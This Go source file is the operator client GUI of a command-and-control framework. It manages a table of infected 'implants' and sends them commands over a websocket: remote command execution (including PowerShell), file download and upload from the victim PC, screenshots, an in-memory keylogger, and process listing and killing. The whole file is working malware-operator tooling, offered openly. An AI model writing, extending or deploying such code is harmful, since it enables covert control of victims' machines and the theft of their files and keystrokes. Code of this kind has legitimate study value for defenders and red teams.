package mainmenu

import (
	"Client/Common"
	"encoding/json"
	"fmt"
	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/driver/desktop"
	"fyne.io/fyne/v2/layout"
	"fyne.io/fyne/v2/widget"
	"log"
	"strconv"
	"strings"
)

var (
	HelpMenuString           string
	ImplantsInteractionMenus map[string]*Common.ImplantInteractionMenu
)

func ParseImplantCommand(Command string) {
	//parse the command and send it to the implant.

	var (
		ImplantName  string
		cmd          string
		subcmd       string
		split_string []string
		PrevCmdWSub  string
		PrevCmd      string
		cmdsplit     []string
		args         []string
		menuobj      *Common.ImplantInteractionMenu
	)

	split_string = strings.Split(Command, "/")
	ImplantName = split_string[0]
	CmdAndArgsString := split_string[1]

	if strings.Contains(CmdAndArgsString, " ") {
		cmdsplit = strings.Split(CmdAndArgsString, " ")
		cmd = cmdsplit[0]
		args = cmdsplit[1:]
	} else {
		cmd = CmdAndArgsString
	}

	if cmd == "help" && len(args) == 1 {
		subcmd = args[0]
	}

	ImplantsInteractionMenus[ImplantName].EntryBar.SetText("")
	menuobj = ImplantsInteractionMenus[ImplantName]

	if subcmd != "" {
		PrevCmdWSub = "> " + cmd + " " + subcmd + "\n"
	} else {
		PrevCmd = "> " + cmd + "\n"
	}

	switch strings.ToLower(cmd) {
	case "help":
		if subcmd != "" {
			switch strings.ToLower(subcmd) {
			case "execute":
				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"Execute Command Help:\n"+
					"Execute a command on the implant.\n"+
					"usage: execute <command>\n"+
					"example: execute whoami\n"+
					"example: exec \"powershell -c 'whoami'\"\n", "\n")...)
				break

			case "exec":
				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"Execute Command Help:\n"+
					"Execute a command on the implant.\n"+
					"usage: execute <command>\n"+
					"example: execute whoami\n"+
					"example: exec \"powershell -c 'whoami'\"\n", "\n")...)
				break

			case "download":
				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"Download Command Help:\n"+
					"Download a file from the target pc implant is infecting.\n"+
					"usage: download <remote file location> <local file location>\n"+
					"example: download C:\\Users\\user\\Desktop\\file.txt C:\\Users\\user\\Downloads\\file.txt\n", "\n")...)
				break

			case "upload":
				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"Upload Command Help:\n"+
					"Upload a file to the target pc implant is infecting.\n"+
					"usage: upload <local file location> <remote file location>\n"+
					"example: upload C:\\Users\\user\\Desktop\\file.txt C:\\Users\\user\\Downloads\\file.txt\n", "\n")...)

				break

			case "screenshot":
				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"Screenshot Command Help:\n"+
					"Take a screenshot of the desktop.\n"+
					"usage: screenshot\n"+
					"example: screenshot\n", "\n")...)

				break

			case "keylogger":
				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"Keylogger Command Help:\n"+
					"Start / Stop Keylogger on implant. This will be a reflected application loaded into memory.\n"+
					"usage: keylogger start <local file storage location> \n"+
					"example: keylogger start C:\\Users\\user\\Documents\\keylog.txt\n"+
					"example: keylogger stop\n", "\n")...)
				break

			case "shutdown":
				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"Shutdown Command Help:\n"+
					"Kill the implant.\n"+
					"usage: shutdown\n"+
					"example: shutdown\n", "\n")...)
				break

			case "sleep":
				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"Sleep Command Help:\n"+
					"Set new sleep time on implant\n"+
					"usage: sleep <time in seconds>\n"+
					"example: sleep 60\n", "\n")...)
				break

			case "list":
				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"List Command Help:\n"+
					"List all files in the current directory. The opt: means optional\n"+
					"usage: list, ls, dir <opt: directory>\n"+
					"example: list C:\\Users\\user\\Documents\n"+
					"example: ls\n", "\n")...)
				break

			case "ls":
				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"List Command Help:\n"+
					"List all files in the current directory. The opt: means optional\n"+
					"usage: list, ls, dir <opt: directory>\n"+
					"example: list C:\\Users\\user\\Documents\n"+
					"example: ls\n", "\n")...)
				break

			case "dir":
				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"List Command Help:\n"+
					"List all files in the current directory. The opt: means optional\n"+
					"usage: list, ls, dir <opt: directory>\n"+
					"example: list C:\\Users\\user\\Documents\n"+
					"example: ls\n", "\n")...)
				break

			case "cd":
				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"CD Command Help:\n"+
					"Change working directory on implant.\n"+
					"usage: cd <directory>\n"+
					"example: cd C:\\Users\\user\\Documents\n", "\n")...)
				break

			case "pwd":
				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"PWD Command Help:\n"+
					"Print working directory on implant.\n"+
					"usage: pwd\n"+
					"example: pwd\n", "\n")...)
				break

			case "ps":
				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"PS Command Help:\n"+
					"List all running processes on implant.\n"+
					"usage: ps, proc\n"+
					"example: ps\n", "\n")...)
				break

			case "proc":
				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"PS Command Help:\n"+
					"List all running processes on implant.\n"+
					"usage: ps, proc\n"+
					"example: ps\n", "\n")...)
				break

			case "kill":
				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"Kill Command Help:\n"+
					"Kill a process on the implant.\n"+
					"usage: kill <process id>\n"+
					"example: kill 1234\n", "\n")...)
				break

			case "lm":
				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"List Modules Command Help:\n"+
					"List all loaded modules on the implant.\n"+
					"usage: lm\n"+
					"example: lm\n", "\n")...)
				break

			case "clear":
				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"Clear Command Help:\n"+
					"Clear the log.\n"+
					"usage: clear\n"+
					"example: clear\n", "\n")...)
				break

			default:
				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+HelpMenuString, "\n")...)
				break
			}
			break
		} else {
			menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+HelpMenuString, "\n")...)
			break
		}

	case "execute":
		//execute a command on the implant.
		str := fmt.Sprintf("[*] Executing command %s on implant.\n", strings.Join(args, " "))
		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+str, "\n")...)
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "exec":
		//execute a command on the implant.
		str := fmt.Sprintf("[*] Executing command %s on implant.\n", strings.Join(args, " "))
		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+str, "\n")...)
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "download":
		//download a file from the target pc implant is infecting.
		if len(args) < 2 {
			menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+"[error] invalid download command.\n", "\n")...)
			return
		}
		str := fmt.Sprintf("[*] Downloading file %s to location %s from implant.\n", args[0], args[1])
		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+str, "\n")...)
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "upload":
		//upload a file to the target pc implant is infecting.
		if len(args) < 2 {
			menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+"[error] invalid upload command.\n", "\n")...)
			return
		}
		str := fmt.Sprintf("[*] Uploading file %s to location %s implant.\n", args[0], args[1])
		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+str, "\n")...)
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "screenshot":
		//take a screenshot of the desktop.
		str := fmt.Sprintf("[*] Taking a screenshot of the desktop.\n")
		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+str, "\n")...)
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "keylogger":
		if len(args) == 0 {
			menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+"[error] invalid keylogger command.\n", "\n")...)
			return
		}
		str := fmt.Sprintf("[*] %sing keylogger on implant.\n", args[0])
		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+str, "\n")...)
		//start / stop keylogger on implant. This will be a reflected application loaded into memory.
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "shutdown":
		//kill the implant.
		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+"[*] Killing the implant.\n", "\n")...)
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "sleep":
		if len(args) == 0 {
			menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+"[error] invalid sleep time.\n", "\n")...)
			return
		}
		arg, err := strconv.Atoi(args[0])
		if err != nil {
			menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+"[error] invalid sleep time.\n", "\n")...)
			return
		}
		str := fmt.Sprintf("[*] Setting new sleep time on implant to %d seconds.\n", arg)
		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+str, "\n")...)
		//set new sleep time on implant
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "list":
		if len(args) == 0 {
			args = append(args, ".")
		}
		str := fmt.Sprintf("[*] Listing all files in the directory %s on the implant.\n", args[0])
		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+str, "\n")...)
		//list all files in the current directory.
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "ls":
		if len(args) == 0 {
			args = append(args, ".")
		}
		str := fmt.Sprintf("[*] Listing all files in the directory %s on the implant.\n", args[0])
		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+str, "\n")...)
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "dir":
		if len(args) == 0 {
			args = append(args, ".")
		}
		str := fmt.Sprintf("[*] Listing all files in the directory %s on the implant.\n", args[0])
		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+str, "\n")...)
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "cd":
		if len(args) == 0 {
			menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+"[error] invalid directory.\n", "\n")...)
			return
		}
		//change directory on implant.
		str := fmt.Sprintf("[*] Changing directory to %s on implant.\n", args[0])
		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+str, "\n")...)
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "pwd":
		//print working directory on implant.
		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+"[*] Printing working directory on the implant.\n", "\n")...)
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "ps":
		//list all running processes on implant.
		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+"[*] Listing all running processes on the implant.\n", "\n")...)
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "proc":
		//list all running processes on implant.
		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+"[*] Listing all running processes on the implant.\n", "\n")...)
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "kill":
		//kill a process on the implant.
		if len(args) == 0 {
			menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+"[error] invalid process id.\n", "\n")...)
			return
		}
		str := fmt.Sprintf("[*] Killing process %d on implant.\n", args[0])
		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+str, "\n")...)
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "lm":
		//list all loaded modules on the implant.
		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+"[*] Listing all loaded modules on the implant.\n", "\n")...)
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "clear":
		menuobj.Text = []string{}
		break

	default: //no recognized command print the help menu
		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+HelpMenuString, "\n")...)
		break
	}
	UpdateCursorRow(ImplantName)
	menuobj.ImplantLog.Refresh()

}

func SendImplantCommand(Command string, args []string, ImplantName string) {
	var (
		WSMessage = Common.WebSocketMessage{
			MessageType: "ImplantCommand",
			Message:     "",
		}
		ImplantCmdData Common.ImplantCommandData
	)
	ImplantCmdData.ImplantName = ImplantName
	ImplantCmdData.Command = Command
	ImplantCmdData.Args = args

	JData, err := json.Marshal(ImplantCmdData)
	if err != nil {
		log.Println("[error] attempting to marshal json data. [SendImplantCommand]:", err)
		return
	}
	WSMessage.Message = string(JData)

	//list all loaded modules on the implant.
	err = g_clientobj.Conn.WriteJSON(WSMessage)
	if err != nil {
		log.Println("[error] attempting to send implant command to the server websocket.", err)
	}

}

func InteractWithImplant(FyneApp fyne.App) {
	var (
		ImplantName            string
		ImplantNum             int
		ImplantInteractionMenu Common.ImplantInteractionMenu
	)

	//Get the selected implant number.
	ImplantNum = Common.ImplantData[Common.SelectedImplant.Row].ImplantNum
	ImplantName = Common.ImplantData[Common.SelectedImplant.Row].ImplantName
	log.Println("Interacting with implant number: ", ImplantNum)

	NewWindow := FyneApp.NewWindow("Interact with Implant")

	//Create the form for interacting with the implant.
	ImplantInteractionMenu.ImplantLog = Common.NewExtendedList(0, func() int {
		return len(ImplantInteractionMenu.Text)
	},
		func() fyne.CanvasObject {
			return container.New(layout.CustomPaddedLayout{
				TopPadding:    -7.5,
				BottomPadding: -7.5,
				LeftPadding:   0,
				RightPadding:  0,
			}, Common.NewCustomLabelWidget(func(m *desktop.MouseEvent) {}))
		},
		func(i widget.ListItemID, obj fyne.CanvasObject) {
			obj.(*fyne.Container).Objects[0].(*Common.CustomLabelWidget).SetText(ImplantInteractionMenu.Text[i])
		})
	ImplantInteractionMenu.ImplantLog.HideSeparators = true
	ImplantInteractionMenu.ImplantName = ImplantName

	HelpMenuString = fmt.Sprintf("%s Help Menu:\nPlease use all listed commands without the '[,]' characters\n", ImplantName)
	HelpMenuString += "[help] - Display this help menu.\n[help] [command] - Display help for a specific command.\n"
	HelpMenuString += "[execute / exec] - Execute a command on the implant.\n"
	HelpMenuString += "[download] - Download a file from the target  pc implant is infecting.\n"
	HelpMenuString += "[upload] - Upload a file to the target pc implant is infecting.\n"
	HelpMenuString += "[screenshot] - Take a screenshot of the desktop.\n"
	HelpMenuString += "[keylogger] - Start / Stop Keylogger on implant. This will be a reflected application loaded into memory.\n"
	HelpMenuString += "[shutdown] - kill the implant.\n"
	HelpMenuString += "[sleep] - Set new sleep time on implant\n"
	HelpMenuString += "[list / ls / dir] - List all files in the current directory.\n"
	HelpMenuString += "[cd] - Change directory on implant.\n"
	HelpMenuString += "[pwd] - Print working directory on implant.\n"
	HelpMenuString += "[ps / proc] - List all running processes on implant.\n"
	HelpMenuString += "[kill] - Kill a process on the implant.\n"
	HelpMenuString += "[lm] - List all loaded modules on the implant.\n"
	HelpMenuString += "[clear] - Clear the log.\n"

	ImplantInteractionMenu.Text = append(ImplantInteractionMenu.Text, strings.Split(HelpMenuString, "\n")...)
	ImplantInteractionMenu.ImplantLog.Refresh()

	ImplantsInteractionMenus[ImplantName] = &ImplantInteractionMenu

	//some fucking go wizardry to ensure that we can update our team's chat if we press enter with text in the chat entry field.
	ImplantInteractionMenu.EntryBar = Common.NewCustomChatEntry(func(text string) {
		ParseImplantCommand(ImplantName + "/" + text)
	})

	//Teams chat entry's combined into one form.
	ImplantForm := &widget.Form{
		Items: []*widget.FormItem{
			{Text: ImplantName, Widget: ImplantInteractionMenu.EntryBar},
		},
		OnSubmit: func() {
			ParseImplantCommand(ImplantName + "/" + ImplantInteractionMenu.EntryBar.Text)
		},
		OnCancel:   NewWindow.Close,
		SubmitText: "",
		CancelText: "Exit",
	}

	vsplit := container.NewVSplit(ImplantInteractionMenu.ImplantLog, ImplantForm)
	vsplit.SetOffset(30)
	vsplit.Refresh()
	NewWindow.SetContent(vsplit)
	size := fyne.Size{Height: 700.0, Width: 1080.0}
	NewWindow.Resize(size)
	NewWindow.Show()
}

func CreateImplantTable(Window fyne.Window, FyneApp fyne.App) *widget.Table {

	ImplantsInteractionMenus = make(map[string]*Common.ImplantInteractionMenu)
	Interact := fyne.NewMenuItem("Interact", func() { InteractWithImplant(FyneApp) })
	menu := fyne.NewMenu("Implant Options", Interact)
	PopUpMenu := widget.NewPopUpMenu(menu, Window.Canvas())
	return Common.CreateImplantTableObject(PopUpMenu)
}

func AddImplantToTable(ImplantData Common.ImplantTableData) {
	//get the actual process name. Not the entire included path.
	split := strings.Split(ImplantData.Process, "\\")
	ImplantData.Process = split[len(split)-1]

	//get the length of the number of current implants.
	count := len(Common.ImplantData)
	ImplantData.ImplantNum = count + 1

	//append implant to our implant table.

	Common.ImplantData = append(Common.ImplantData, ImplantData)
	Common.ImplantTable.Refresh()
}

func ReregisterImplant(NewImplantData Common.ImplantTableData, index int) {
	//get the actual process name. Not the entire included path.
	split := strings.Split(NewImplantData.Process, "\\")
	NewImplantData.Process = split[len(split)-1]

	//get the length of the number of current implants.
	NewImplantData.ImplantNum = index

	//replace the implant data in our implant table.
	Common.ImplantData[index] = NewImplantData

	Common.ImplantTable.Refresh()

}

// TODO: Implement this function.
func RemoveImplantFromTable() {

}

func GetActiveImplants(clientobj *Common.Client, Message Common.WebSocketMessage) ([]byte, error) {

	endpoint := "https://" + clientobj.Server + "/GetActiveImplants"
	JData, err := json.Marshal(Message)

	data, err := Common.PerformHTTPReq(clientobj, endpoint, JData)
	if err != nil {
		if err.Error() == "unauthorized" {
			clientobj.Authenticated = false
		}
		log.Println("[error] attempting to retrieve implant data", err)
	}

	trimedstr := strings.Trim(string(data), "\"")

	decoded := Common.Base64Decode(trimedstr)

	return decoded, nil

}

func UpdateImplantHealth(ImplantData Common.ImplantTableData) {
	//get the length of the number of current implants.
	count := len(Common.ImplantData)

	for i := 0; i < count; i++ {
		if Common.ImplantData[i].ImplantName == ImplantData.ImplantName {
			Common.ImplantData[i].Health = ImplantData.Health
			Common.ImplantTable.Refresh()
			break
		}
	}
}

func UpdateImplantCheckin(ImplantData Common.ImplantTableData) {
	//get the length of the number of current implants.
	count := len(Common.ImplantData)

	for i := 0; i < count; i++ {
		if Common.ImplantData[i].ImplantName == ImplantData.ImplantName {
			Common.ImplantData[i].LastCheckIn = ImplantData.LastCheckIn
			Common.ImplantTable.Refresh()
			break
		}
	}
}

func UpdateCursorRow(ImplantName string) {
	menuobj := ImplantsInteractionMenus[ImplantName]
	menuobj.ImplantLog.ScrollToBottom()
	menuobj.ImplantLog.Refresh()
}

func SendDataToImplantWindow(ImplantData Common.ImplantTableData, Data interface{}, datatype int) {
	var (
		typeofdata string
		TempData   interface{}
		menuobj    = ImplantsInteractionMenus[ImplantData.ImplantName]
	)

	switch datatype {
	case 1: // MODULE DATA
		typeofdata = "Module Data"
		TempData = Data.(map[string][]byte)
		menuobj.Text = append(menuobj.Text, strings.Split(fmt.Sprintf("[*] Received %s from implant: %s\n", typeofdata, ImplantData.ImplantName), "\n")...)
		menuobj.ImplantLog.Refresh()
		var strobj string
		for key, value := range TempData.(map[string][]byte) {
			module_name := strings.Split(key, "\\")
			strobj += fmt.Sprintf("Module: [%s] Loaded at: [0x", module_name[len(module_name)-1])
			for _, b := range value {
				strobj += fmt.Sprintf("%02x", b)
			}
			strobj += "]\n"
		}

		menuobj.Text = append(menuobj.Text, strings.Split(strobj, "\n")...)
		menuobj.ImplantLog.Refresh()
		break // send module data.
	default:
		break // default
	}

	UpdateCursorRow(ImplantData.ImplantName)
}
